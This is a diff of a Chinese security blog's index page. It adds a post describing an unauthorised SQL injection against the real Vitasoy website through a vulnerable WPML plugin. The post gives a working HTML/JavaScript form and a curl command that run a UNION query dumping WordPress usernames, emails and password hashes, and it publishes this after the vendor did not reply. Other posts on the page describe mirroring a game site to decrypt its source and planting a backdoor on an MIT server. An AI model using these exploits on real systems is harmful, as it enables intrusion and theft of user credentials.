@@ -152,6 +152,73 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-维他奶官网SQL注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/06/27/cj4gt3jeq0000udpv4ouaguwt/">维他奶官网SQL注入漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2017/06/27/cj4gt3jeq0000udpv4ouaguwt/" class="archive-article-date">
+  	<time datetime="2017-06-27T21:31:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>近日买了一瓶柠檬饮料，感觉很爽，就决定去他们官网留个爪爪表示好评。</p>
+<p>访问网站，一眼看出WordPress 4.7版本，经过NMAP等软件测试，网站没有WAF，准备尝试从漏洞插件入侵。通过WPScan的扫描，我们发现一个漏洞插件”WPML 3.1.9”，在Exploit-DB上给出了详细的<a href="https://www.exploit-db.com/exploits/36414/" target="_blank" rel="external">EXP代码</a>。</p>
+<p>直接打开文本编辑器，输入SQL Injection 的EXP。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var union=&quot;select user_login,1,user_email,2,3,4,5,6,user_pass,7,8,9,10,11,12 from wp_users&quot;;</div><div class="line">if (document.location.search.length &lt; 2)</div><div class="line">    document.location.search=&quot;lang=xx&apos; UNION &quot;+union+&quot; -- -- &quot;;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;form method=POST action=&quot;http://vitasoy.com/comments/feed&quot;&gt;</div><div class="line">&lt;input type=hidden name=action value=&quot;wp-link-ajax&quot;&gt;</div><div class="line">&lt;input type=submit&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
+<p>或者通过CURL工具。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl --data &quot;action=wp-link-ajax&quot; --refer &quot;http://google.com/wp.html?lang=xx%27%20UNION%20select%20user_login,1,user_email,2,3,4,5,6,user_pass,7,8,9,10,11,12%20from%20wp_users%20--%20--%20&quot; http://www.vitasoy.com/comments/feed</div></pre></td></tr></table></figure>
+<p>点击Submit或者执行命令，即可成功注入。大家可以替换UNION查询语句来查询其他数据。送上截图～</p>
+<img src="/2017/06/27/cj4gt3jeq0000udpv4ouaguwt/20170625.png" alt="20170625.png" title="">
+<p>截止目前没有得到回复，所以，暑假快乐！</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">-- 渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/06/27/cj4gt3jeq0000udpv4ouaguwt/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
     <article id="post-5分钟破解某内测狼人杀手游" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -159,12 +226,12 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/17/cj42wudht0000ukpvnqerd4r1/">5分钟破解某内测狼人杀手游</a>
+      <a class="article-title" href="/2017/06/17/cj4gsylpv0000s3pv53ri85w2/">5分钟破解某内测狼人杀手游</a>
     </h1>
   
 
         
-        <a href="/2017/06/17/cj42wudht0000ukpvnqerd4r1/" class="archive-article-date">
+        <a href="/2017/06/17/cj4gsylpv0000s3pv53ri85w2/" class="archive-article-date">
   	<time datetime="2017-06-18T03:45:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-18</time>
 </a>
         
@@ -175,13 +242,13 @@
         <p>刚开始在QQ空间看见了这款游戏的推送，有点感兴趣就下载了APK开始apktool解包分析，直接定位到资源目录，看到了很多lua文件，再加上lib目录下的Cocos2d库，断定这是一款基于lua开发的手游，于是需要拿到源码。</p>
 <p>如果我们直接打开lua文件，会发现乱码，只有头部的wolf清晰可见，于是经验告诉我们这是一款简单的基于XXTEA加密的文件。如今还有一些人宣称这很安全，可是真的如此？我们继续寻找。</p>
 <p>lua文件里有一些没有加密的，打开发现是判断版本的网站URL，访问后直接就是目录列表。</p>
-<img src="/2017/06/17/cj42wudht0000ukpvnqerd4r1/74553238c7ab826c.jpg" alt="74553238c7ab826c.jpg" title="">
+<img src="/2017/06/17/cj4gsylpv0000s3pv53ri85w2/74553238c7ab826c.jpg" alt="74553238c7ab826c.jpg" title="">
 <p>于是为了保证lua最新，直接Dump全站。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -m http://www.weixin****.com/</div></pre></td></tr></table></figure>
 <p>完成后我们开始解密，直接IDA打开libcocos2dlua.so，寻找字符串wolf，在其不远处有疑似的Key。</p>
-<img src="/2017/06/17/cj42wudht0000ukpvnqerd4r1/-f0fffdf88a10ab5.png" alt="-f0fffdf88a10ab5.png" title="">
+<img src="/2017/06/17/cj4gsylpv0000s3pv53ri85w2/-f0fffdf88a10ab5.png" alt="-f0fffdf88a10ab5.png" title="">
 <p>我们之间使用吾爱的批量工具进行解密，在此我想问一下作者，解密完后退出了软件，软件进程还在运行占用内存是什么意思？如果没有问题，或者我电脑出了问题，恕我冒犯，在此道歉。</p>
-<img src="/2017/06/17/cj42wudht0000ukpvnqerd4r1/1497799957261.jpg" alt="1497799957261.jpg" title="">
+<img src="/2017/06/17/cj4gsylpv0000s3pv53ri85w2/1497799957261.jpg" alt="1497799957261.jpg" title="">
 <p>于是解密完成，可以获取全部的游戏源码。我已经通知了厂商，但是没有回复。希望大家以后选择luajit等等方式来保证源码的安全。</p>
 
       
@@ -210,7 +277,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/17/cj42wudht0000ukpvnqerd4r1/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/06/17/cj4gsylpv0000s3pv53ri85w2/">展开全文 >></a>
         </p>
       
 
@@ -232,12 +299,12 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/16/cj42wudi90005ukpvgqtujyh4/">The one shocking the world.</a>
+      <a class="article-title" href="/2017/06/16/cj4gsylqd0005s3pv0fzxv3kh/">The one shocking the world.</a>
     </h1>
   
 
         
-        <a href="/2017/06/16/cj42wudi90005ukpvgqtujyh4/" class="archive-article-date">
+        <a href="/2017/06/16/cj4gsylqd0005s3pv0fzxv3kh/" class="archive-article-date">
   	<time datetime="2017-06-17T02:55:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-17</time>
 </a>
         
@@ -270,7 +337,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/16/cj42wudi90005ukpvgqtujyh4/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/06/16/cj4gsylqd0005s3pv0fzxv3kh/">展开全文 >></a>
         </p>
       
 
@@ -292,12 +359,12 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/10/cj42wudi40003ukpv54q62jgq/">MIT just got pwned.</a>
+      <a class="article-title" href="/2017/06/10/cj4gsylq80003s3pv8og3ue6q/">MIT just got pwned.</a>
     </h1>
   
 
         
-        <a href="/2017/06/10/cj42wudi40003ukpv54q62jgq/" class="archive-article-date">
+        <a href="/2017/06/10/cj4gsylq80003s3pv8og3ue6q/" class="archive-article-date">
   	<time datetime="2017-06-10T15:35:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-10</time>
 </a>
         
@@ -306,8 +373,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>几个月前我们黑进了麻省理工的一台服务器，通过分析是一台独立的服务器，为了证明身份我们已经把HTTPS证书下载，可以通过RSA验证身份。</p>
-<img src="/2017/06/10/cj42wudi40003ukpv54q62jgq/5724b86c0fdf9528.jpg" alt="5724b86c0fdf9528.jpg" title="">
-<img src="/2017/06/10/cj42wudi40003ukpv54q62jgq/-1088341481842e08.png" alt="-1088341481842e08.png" title="">
+<img src="/2017/06/10/cj4gsylq80003s3pv8og3ue6q/5724b86c0fdf9528.jpg" alt="5724b86c0fdf9528.jpg" title="">
+<img src="/2017/06/10/cj4gsylq80003s3pv8og3ue6q/-1088341481842e08.png" alt="-1088341481842e08.png" title="">
 <p>目前我们的Backdoor已经主动删除，这里只是想表明很多时候，安全疏忽带来的危险比你想象的大的多。</p>
 
       
@@ -332,7 +399,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/10/cj42wudi40003ukpv54q62jgq/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/06/10/cj4gsylq80003s3pv8og3ue6q/">展开全文 >></a>
         </p>
       
 
@@ -354,12 +421,12 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/10/cj42wudi50004ukpv597ityup/">Sensitive Buster目录扫描工具</a>
+      <a class="article-title" href="/2017/06/10/cj4gsylq90004s3pvsum20j6h/">Sensitive Buster目录扫描工具</a>
     </h1>
   
 
         
-        <a href="/2017/06/10/cj42wudi50004ukpv597ityup/" class="archive-article-date">
+        <a href="/2017/06/10/cj4gsylq90004s3pvsum20j6h/" class="archive-article-date">
   	<time datetime="2017-06-10T04:15:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-10</time>
 </a>
         
@@ -402,7 +469,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/10/cj42wudi50004ukpv597ityup/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/06/10/cj4gsylq90004s3pvsum20j6h/">展开全文 >></a>
         </p>
       
 
@@ -424,12 +491,12 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/09/cj42wudhy0001ukpvgmtqobyc/">Hello World</a>
+      <a class="article-title" href="/2017/06/09/cj4gsylq30001s3pvkh48vjxg/">Hello World</a>
     </h1>
   
 
         
-        <a href="/2017/06/09/cj42wudhy0001ukpvgmtqobyc/" class="archive-article-date">
+        <a href="/2017/06/09/cj4gsylq30001s3pvkh48vjxg/" class="archive-article-date">
   	<time datetime="2017-06-09T18:00:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-10</time>
 </a>
         
@@ -465,7 +532,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/09/cj42wudhy0001ukpvgmtqobyc/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/06/09/cj4gsylq30001s3pvkh48vjxg/">展开全文 >></a>
         </p>
       
 
@@ -598,6 +665,10 @@ return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){v
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Fuzzer</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">-- 渗透测试</a>
               </li>
             
             <div class="clearfix"></div>
